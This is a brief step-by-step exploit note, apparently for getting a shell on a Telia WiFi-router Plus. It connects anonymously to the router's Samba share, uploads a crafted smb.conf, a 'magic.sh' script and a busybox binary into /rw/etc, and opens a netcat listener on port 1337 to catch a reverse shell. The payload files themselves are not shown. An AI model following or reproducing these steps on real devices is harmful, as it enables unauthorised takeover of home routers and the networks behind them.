Telia WiFi-router Plus

1. First connect to samba when u have dd 41GATE31.img to a ext2/3 stick

2- smbclient //192.168.1.253/Disk_a1 -N

3. Now move smb.conf and magic.sh put busybox-mips to /rw/etc

4. chmod +x <files>

5. cd rootlink\rw\etc

6. put smb.conf

7. put magic.sh

8.put busybox-mips

9.open another window and run nc -lvvp 1337

10.while waiting, upload smb.conf /rw/etc again..
